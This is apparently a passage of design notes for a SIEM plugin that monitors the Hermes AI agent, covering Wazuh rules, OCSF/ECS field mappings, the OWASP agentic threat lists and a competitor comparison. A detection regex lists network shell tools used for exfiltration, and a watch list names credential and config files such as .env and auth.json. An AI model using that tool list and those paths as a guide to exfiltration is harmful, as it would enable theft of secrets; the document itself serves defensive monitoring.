[Rules syntax (current)](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html) (all retrieved 2026-11-07; "current" nav lists 4.14.10).

- **Agent ingestion**: `ossec.conf` on the agent/manager:

  ```xml
  <localfile>
    <log_format>json</log_format>
    <location>/home/<user>/.hermes/plugin-data/siemless/export/ocsf.jsonl</location>
    <label key="source">siemless</label>
  </localfile>
  ```
  (`<label>` on a localfile is standard Wazuh — **UNVERIFIED on the fetched pages**; the fetched
  JSON decoder page covers decoding only.) One JSON object per line.
- **JSON decoder**: built in; no custom decoder needed. Every JSON field becomes a **dynamic
  field**, nested objects flattened with dots (`alert.signature_id` in the docs' Suricata
  example; for us `metadata.product.name`, `process.cmd_line`, `finding_info.attacks.technique.uid`).
  Supported: numbers, strings, booleans, null, arrays, objects; **arrays of objects are not
  supported** — so `observables[]`, `evidences[]`, `finding_info.attacks[]` will not decode as
  fields. Mitigation: also emit flattened scalars in `unmapped` (e.g.
  `unmapped.attack_ids = "T1552.001,T1700"`, `unmapped.observable_urls = "…"`) for Wazuh rules.
- **Rules**: live in `/var/ossec/etc/rules/local_rules.xml` (or new files in `/var/ossec/etc/rules/`);
  **custom ids 100000–120000**; `overwrite="yes"` to replace a stock rule (then `if_sid`/`if_group`/
  `if_level`/`if_matched_*` are ignored). Level range 0–15/16 — **UNVERIFIED on fetched pages**
  (examples show 0, 5, 10). Syntax verified: `<rule id="" level="">`, `<decoded_as>json</decoded_as>`,
  `<field name="…">regex</field>` (matches a decoder-extracted field; `negate`/`type="pcre2"` attrs
  not visible on fetched page → **UNVERIFIED**), `<match>` (sregex), `<regex>` (OS regex),
  `<if_sid>`, `<description>`, `<group>`, `<mitre><id>T1698</id></mitre>`. Frequency/correlation
  (`frequency`, `timeframe`, `<if_matched_sid>`, `<same_field>`) exist in the Rules Syntax reference
  but were in the unfetched part of the page → **UNVERIFIED** exact attribute names.

  ```xml
  <group name="siemless,hermes,ocsf,">
    <rule id="100500" level="3">
      <decoded_as>json</decoded_as>
      <field name="metadata.product.name">^SIEMless$</field>
      <description>SIEMless: Hermes agent OCSF event</description>
    </rule>
    <rule id="100510" level="12">
      <if_sid>100500</if_sid>
      <field name="class_uid">^2004$</field>
      <field name="unmapped.attack_ids">T1700</field>
      <description>SIEMless: AI-enabled exfiltration pattern in Hermes session $(metadata.correlation_uid)</description>
      <mitre><id>T1700</id><id>T1698</id></mitre>
    </rule>
  </group>
  ```
- **Testing**: `/var/ossec/bin/wazuh-logtest`, paste one JSON line; output shows pre-decoding,
  decoding (dynamic fields), and the matched rule id/level. Restart `wazuh-manager` to alert.
  MITRE ids in `<mitre>` must exist in Wazuh's bundled MITRE DB; **T1698/T1699/T1700/T1685 may
  not be in the Wazuh MITRE DB yet** (it tracks ATT&CK releases with lag) → **UNVERIFIED**; expect
  a warning, not a failure.

---

## 8. Elastic / ECS

Source: [ECS reference](https://www.elastic.co/docs/reference/ecs) (states **ECS 9.5.0**),
[event.kind](https://www.elastic.co/docs/reference/ecs/ecs-allowed-values-event-kind),
[event.category](https://www.elastic.co/docs/reference/ecs/ecs-allowed-values-event-category) (all retrieved 2026-11-07).

- **event.kind**: `alert` (detections from outside the stack — use for our Detection Findings),
  `event` (default), `enrichment`, `metric`, `state`, `asset` (beta), `pipeline_error`,
  `signal` (reserved for Kibana; never set).
- **event.category → expected event.type**: `process` → access, change, end, info, start;
  `file` → access, change, creation, deletion, info; `network` → access, allowed, connection,
  denied, end, info, protocol, start; `web` → access, error, info; `api` → access, admin,
  allowed, change, creation, deletion, denied, end, info, start, user; `configuration` → access,
  change, creation, deletion, info; `package` → access, change, deletion, info, installation,
  start; `iam` → admin, change, creation, deletion, group, info, user; `intrusion_detection` →
  allowed, denied, info; `session` → start, end, info. `event.outcome` values
  (`success|failure|unknown`) were not on the fetched pages → **UNVERIFIED** (stable since ECS 1.x).
- **OCSF → ECS field map** for our events:

  | OCSF | ECS |
  |---|---|
  | `class_uid` 1007 | `event.category: [process]`, `event.type: [start]`, `process.command_line`, `process.pid`, `process.user.name` |
  | 1001 | `event.category: [file]`, `event.type: [access\|change\|creation\|deletion]`, `file.path`, `file.name`, `file.hash.sha256` |
  | 4002 | `event.category: [web, network]`, `event.type: [access]`, `url.full`, `url.domain`, `http.request.method`, `destination.domain`, `destination.port`, `user_agent.original` |
  | 4001 | `event.category: [network]`, `event.type: [connection]`, `destination.ip/domain/port`, `network.protocol` |
  | 6003 | `event.category: [api]`, `event.action: <tool_name>`, `event.type: [access\|change]` |
  | 1006 | `event.category: [process]` or `[configuration]`, `event.type: [creation]`, `process.command_line` (cron line) |
  | 6002 | `event.category: [package]`, `event.type: [installation]`, `package.name`, `package.version` |
  | 5019 / config edit | `event.category: [configuration]`, `event.type: [change]`, `file.path` |
  | 2004 | `event.kind: alert`, `event.category: [intrusion_detection]`, `event.type: [info]`, `rule.id/name/category/version/ruleset: siemless`, `threat.framework: "MITRE ATT&CK"`, `threat.technique.id/name/reference`, `threat.tactic.id/name/reference` |
  | approvals | `event.outcome: success\|failure`, `event.action: approval.<choice>`, `event.type: [allowed\|denied]` |
  | `metadata.correlation_uid` / ids | `event.id` = tool_call_id, `transaction.id` = turn_id, `trace.id` = session_id, `related.user`, `related.hosts`, `related.ip`, `related.hash` |
  | `ai_agent`, `metadata.product` | `agent.name: hermes-agent`, `agent.type: hermes`, `agent.version`, `agent.id` = profile, `observer.vendor: ASV Labs`, `observer.product: SIEMless`, `user.name` = gateway sender |
  | `severity_id` | `event.severity` (0–100ish; use 10/30/50/70/90/100), `event.risk_score` |
  | `time` | `@timestamp` (ISO 8601) |

- **Native OCSF in Elastic**: the Amazon Security Lake integration ingests OCSF (Parquet from
  S3) and Elastic has an `ocsf` field-set discussion thread; a generic "OCSF JSON over HTTP"
  integration was **not confirmed → UNVERIFIED**. Simplest path: ship ECS-mapped docs ourselves.
- **Ingestion**: `POST /_bulk` (or `/<data-stream>/_bulk`), `Content-Type: application/x-ndjson`,
  action line + source line per doc, trailing newline. Data streams follow the
  `logs-<dataset>-<namespace>` naming (`logs-siemless.ocsf-default`) and **accept only the
  `create` action** — the `docs-bulk` page could not be fetched (robots) → **UNVERIFIED** this
  session, but these are long-stable rules. Auth: `Authorization: ApiKey <base64>`.

---

## 9. OWASP + NIST (one paragraph)

The current OWASP list is the **Top 10 for LLM Applications 2025**: LLM01 Prompt Injection,
LLM02 Sensitive Information Disclosure, LLM03 Supply Chain, LLM04 Data and Model Poisoning,
LLM05 Improper Output Handling, **LLM06 Excessive Agency**, LLM07 System Prompt Leakage,
LLM08 Vector and Embedding Weaknesses, LLM09 Misinformation, LLM10 Unbounded Consumption
([genai.owasp.org LLM06](https://genai.owasp.org/llmrisk/llm06/), retrieved 2026-11-07; no 2026
edition appears on the site). The agentic companion is the **OWASP Top 10 for Agentic
Applications** (released 2025-12-09): ASI01 Agent Goal Hijack, ASI02 Tool Misuse, ASI03 Identity
& Privilege Abuse, ASI04 Agentic Supply Chain Vulnerabilities, ASI05 Unexpected Code Execution,
ASI06 Memory & Context Poisoning, ASI07 Insecure Inter-Agent Communication, ASI08 Cascading
Failures, ASI09 Human-Agent Trust Exploitation, ASI10 Rogue Agents, published with
"Agentic AI Threats & Mitigations" v1.1
([OWASP announcement](https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agent), retrieved 2026-11-07).
Tag SIEMless rules with both (`owasp.llm01`, `owasp.asi02`) in Sigma `tags` and OCSF
`finding_info.types[]`. NIST: **AI RMF 1.0 (NIST AI 100-1, Jan 2023)** — Govern/Map/Measure/Manage;
SIEMless evidences MEASURE and MANAGE outcomes (monitoring deployed systems). The agent-specific
NIST work is the **COSAiS** project (SP 800-53 Control Overlays for Securing AI Systems): concept
paper 2025-08-14, predictive-AI overlay annotated outline 2026-01-08, and two **planned but
unpublished** overlays "Using AI Agent Systems: Single Agent" and "Multi-Agent"; the project was
renamed COSIS on 2026-10-20 under a 2026-09-29 executive order
([csrc.nist.gov/projects/cosais](https://csrc.nist.gov/projects/cosais), retrieved 2026-11-07).
Cite it as "planned overlays", not as published guidance. AI 100-1's publication date and
AI 600-1 (GenAI profile) were not re-fetched → **UNVERIFIED** this session.

---

## 10. Competitor capability matrix

Based on `provides_hooks`/descriptions in `/home/claude/hk/catalog.json` (generated 2026-11-08T03:20Z),
`/home/claude/hk/ext/hermes-cyber-au/README.md` + `plugins/cyber-au/plugin.yaml`, and a clone of
`briancaffey/hermes-otel` (`main`, plugin.yaml version 1.32.6; catalog pins v1.18.2).

| Plugin (ver) | Hooks used | Security semantics | Detection rules | SIEM outputs | Blocks or observes | Desktop UI | What SIEMless does that it doesn't |
|---|---|---|---|---|---|---|---|
| **hermes_otel** (1.18.2 cat / 1.32.6 main) | 36 incl. all session/API/tool/approval/subagent/kanban/human-input/`pre_command`/`on_skill_lifecycle` | **No** — OTel GenAI semconv spans/metrics/logs (`gen_ai.*`, `hermes.tool.call`, `hermes.approval.decision`); no ATT&CK/OCSF, zero security vocabulary in source | None | OTLP http/grpc to ~26 backends incl. **Elastic**, SigNoz, Honeycomb, Grafana; local SQLite | Observes | Dashboard tab `/otel` (dashboard manifest, not `desktop/plugin.js`) | OCSF event classes, ATT&CK/OWASP tagging, correlation + detections, Wazuh/Splunk HEC/CEF/syslog, record-integrity chain |
| **traceverse_hermes_otel** (2.0.1) | 8 (session, pre_llm, transform_llm_output, post_api, post_tool) | No | None | OTLP to `localhost:4318`; GPU/energy/CO2 metrics | Observes | none listed | everything security-shaped |
| **flightlog** (0.1.0) | 11 (session, tool, api, subagent, approval, transform_llm_output, pre_tool_call opt-in) | Partial — "runs that went wrong" (hidden errors, loops, token spikes, failed subagents) — reliability, not threat | Heuristics, count unknown; LLM-written incident report | Local SQLite only | Observes; opt-in loop tripwire → approval | Yes (desktop page + dashboard tab) | threat semantics, standards export, deterministic rules |
| **privacy-xray** (1.0.0) | 2 (`pre_api_request`, `pre_auxiliary_call`) + `llm_request` middleware | Partial — PII-type counts per outbound **model** request, vendor/HQ country | Config audit checks (`/xray check`); no event rules | Local JSONL ledger, HTML report | Observes (masking middleware optional) | Dashboard tab (sandboxed HTML) | tool-level telemetry (process/file/network), SIEM formats, ATT&CK |
| **hermes-tenuo** (0.1.3) | 5 (pre/post_tool_call, session start/end, subagent_start) | Yes — per-call authorization warrants | Policy, not detections | Local `audit.jsonl`; optional stream to Tenuo control plane (compiled Rust SDK) | **Blocks** (no-op until warrant configured) | none | observer-only, standards-formatted, SIEM-native; no vendor control plane |
| **tripwire** (0.1.1) | 3 (post_tool_call, post_approval_response, pre_tool_call drill) | Minimal — logs refusals only | None | JSONL (`~/.hermes/tripwire/events.jsonl`) for a cron alert | Observes | none | full event model, not just refusals; standards |
| **llm-antidote** (3.2.4) | 6 (pre/post_tool_call, pre_api_request, session) | Yes — capability policy, model admission | Policy, eval suite | none | **Blocks / requires approval** | none | observe-only telemetry export |
| **airlock** (0.3.0) | 6 (pre/post_tool_call, pre_llm_call, subagent_start, on_session_reset, post_approval_response) | Yes — taint tracking, exfil shapes, 362-attack corpus | Rich inline rule set (count not stated) | Local journal under plugin-data | **Blocks / approval gate** | none | export & correlation across sessions; we complement (SIEMless can ingest airlock's `blocked` statuses) |
| **jev-judge** (0.1.0) | 1 (pre_tool_call) + `jev_ask` tool | Yes — LLM judgment destructive/exfil/impact | Thresholds in code | JSONL decisions | Blocks (shadow default) | none | deterministic, no third-party LLM egress |
| **hermes-secret-gate** (1.0.0) | 1 (post_tool_call) + 3 tools | Yes — secret scan of agent-drafted output | Deterministic scan | receipts | Blocks (fail-closed) | none | breadth beyond secrets; SIEM export |
| **canary-trap** (0.1.0) | 3 (pre_llm_call, pre_tool_call, transform_llm_output) | Yes — decoy credential | 1 mechanism | plugin state | Blocks | none | telemetry, standards |
| **camel-guard** (1.1.1) | 5 (pre_llm_call, pre/post_tool_call, session end/reset) | Yes — capability gating after untrusted output | Policy | none | Blocks | none | telemetry/export |
| **cost-sentinel** (1.0.0) | 4 (post_api_request, api_request_error, post_auxiliary_call, pre_llm_call) | No — cost | Budget gate | SQLite | Blocks (hard gate opt-in) | Yes (pane + status chip) | security |
| **lineage** (0.1.5, ours) | 10 (session, llm, api, aux, post_tool_call, subagent) | No — provenance/integrity (SHA-256 receipts, observed/evidenced/inferred links) | None | SQLite, `.receipt.json`, Mermaid/DOT | Observes | Yes | reuse its hook plumbing + hashing; SIEMless adds security classification and export |
| **hermes-cyber-au** (0.1.0, profile distribution) | 5 (pre/post_tool_call, pre_llm_call, session start/end) | Yes — AU SOC analyst assistant; hash-chained audit log of its own tool calls; untrusted-content guards | Hunts **with** Sigma/KQL for Sentinel/Defender (analyst skill), not rules about Hermes | STIX 2.1 export of intel; audit log local | Blocks write tools if audit log unwritable | none | it is a consumer of SIEM data about *other* systems; SIEMless makes Hermes itself a SIEM data source |

No catalog entry emits OCSF, Sigma, CEF, RFC 5424 or Splunk HEC; none maps Hermes activity to
ATT&CK. Name check in BASELINE.md stands (`siemless`, `siem`, `ocsf` absent from 1,200 entries).

**Defensible differentiation (5 bullets)**

1. **Only plugin that speaks the SOC's schema.** OCSF 1.9.0 classes with `ai_agent`/`delegation`
   objects and the `record_integrity` hash chain — the exact features OCSF shipped on 2026-08-03
   for agent telemetry; competitors emit OTel spans or private JSON.
2. **Detections mapped to ATT&CK v20.1's new AI techniques** (T1698/T1699/T1700/T1685.007) plus
   OWASP LLM 2025 and Agentic Top 10 ids, shipped as **Sigma 2.1 rules + correlation rules** that
   convert to Splunk/ES|QL/Sentinel via sigma-cli — no one else ships rule content at all.
3. **Observer-only by contract**: no `pre_tool_call` block path, no LLM calls, no third-party
   egress except the SIEM the operator configures — passes catalog rules 12–13 cleanly, unlike
   the blocking guards (airlock, tenuo, antidote, jev-judge) and the LLM-calling ones (flightlog, jev-judge).
4. **Four transports SOCs already run** (JSONL file for Wazuh `localfile`, RFC 5424/5425 syslog,
   CEF for ArcSight/QRadar/Sentinel CEF connectors, Splunk HEC with ack) plus ECS mapping for
   Elastic — hermes_otel reaches Elastic only via OTLP spans, which Elastic Security rules do not consume.
5. **Composes with the blockers instead of competing**: `post_tool_call.status="blocked"` from
   airlock/tenuo/canary-trap becomes an OCSF event with `disposition_id=2 Blocked` and a Detection
   Finding — SIEMless is the evidence layer for every guard in the catalog.

---

## 11. Unverified assumptions, blocked sources, and Hermes visibility gaps

**Blocked / unfetched (do not retry without permission)**
- `https://attack.mitre.org/techniques/T1698/`, `/T1700/`, `/resources/updates/` — provenance block; verified instead from the STIX bundle.
- `https://schema.ocsf.io/` — robots; verified from the ocsf-schema repo at tag v1.9.0.
- `https://elastic.co/guide/en/elasticsearch/reference/8.14/docs-bulk.html` — robots.

**UNVERIFIED (label in code/docs until confirmed)**
1. `schema.ocsf.io/export/schema` and `/schema/classes/<name>` URL shapes for compiled JSON Schema; `ocsf-validator` package version/API.
2. OCSF `status_id` 1 Success / 2 Failure — taken from class convention; the dictionary only fixes 0/99. Check each class file before emitting.
3. `sigma check <path>` exact subcommand and flags; `ATTACKTagValidator` behaviour on v20 tactic names (`stealth`, `defense-impairment`).
4. IANA PEN for `siemless@<PEN>` SD-ID — none registered; 32473 is the RFC documentation PEN.
5. Splunk HEC default port 8088 (only shown in examples), `max_content_length` default, exact UI path for token creation, Splunk OCSF add-on status.
6. Wazuh: `<localfile><label>`, rule `level` range, `<field negate type=>` attributes, `frequency`/`timeframe`/`<if_matched_sid>`/`<same_field>` exact syntax; whether Wazuh's MITRE DB knows T1698/T1699/T1700/T1685.
7. ECS `event.outcome` values; data-stream `create`-only rule; `logs-*-*` naming; Elastic OCSF integration beyond Amazon Security Lake.
8. NIST AI 100-1 publication date (Jan 2023 from memory), AI 600-1 status; COSAiS agent overlays have **no published draft**.
9. hermes_otel catalog pin is 1.18.2 but `main` is 1.32.6 — matrix reflects `main`; competitor hook lists come from catalog `capabilities` and may lag their repos.
10. hermes-cyber-au's audit log format (hash-chained, per README) was not opened; no SIEM export claimed.

**Hermes visibility gaps (from observer-hooks.md, plugins.py VALID_HOOKS, BASELINE.md)**
- **No hook for cron job creation** — infer from `cronjob` tool `args` in `pre/post_tool_call`; model as 1006 with `job.type_id=99 Other, type="hermes-cron"` and `confidence_id=2`.
- **No hook for plugin install/enable** — infer from `terminal` args matching `hermes plugins install|enable` / `pip install` / `uv add`, or `pre_command` (`/plugins …` slash command; returns ignored, fires on CLI + gateway only, **not** the running-agent intercept path). Model as 6002 Install.
- **No hook for config edits** — infer from `write_file`/`patch`/`terminal` args whose path matches `config.yaml`, `.env`, `SOUL.md`, `hooks/`, `auth.json`; `post_compaction` and `on_skill_lifecycle` exist but no `on_config_change`.
- **Terminal egress is visible only as command text** — no socket/HTTP hook for `terminal`/`execute_code`; 4001/4002 events from the shell are **inferred** (regex over `cmd_line` for `curl|wget|nc|ssh|scp|git push|python -c "…requests…"`) and must carry `confidence_id` ≤ 2 and `unmapped.inference="cmd_line"`. Browser/`web_fetch` tools give real URLs.
- **Payloads are pre-sanitized**: `pre_api_request.request` / `post_api_request.response` are bounded and key-redacted; `subagent_stop.tool_call_history` is metadata-only (names, arg names, byte counts, bounded targets; query strings stripped). Do not promise full-fidelity prompt capture.
- **Approvals are observe-only** (`pre_approval_request`/`post_approval_response`, `on_human_input_*`); `choice` ∈ `once|session|always|deny|timeout|cancelled`; smart (aux-LLM) approvals do **not** fire `on_human_input_*`. `surface` ∈ `cli|gateway|smart|mcp-elicitation/<server>|mcp-trust/<server>|vault-payment`.
- **`post_tool_call` fires for blocked/cancelled** with `status`, so other guards' blocks are observable; the blocking plugin's identity is **not** in the payload (only `error_type`/`error_message`).
- **Correlation keys available**: `session_id`, `task_id`, `turn_id`, `api_request_id` (opaque), `api_call_count`, `tool_call_id`, `parent/child_session_id`, `parent/child_subagent_id`, `parent_turn_id`; `telemetry_schema_version="hermes.observer.v1"` injected on every payload.
- **No per-event wall-clock in tool hooks** — `post_tool_call` gives `duration_ms`, not `started_at`; stamp `time` at hook receipt.
- Catalog admission (README rules 6, 11–13): declared hooks must match reality; secrets only via `agent.secret_scope.get_secret`; telemetry export must be **opt-in**; disclose network destinations (the SIEM endpoints) in README/PR.
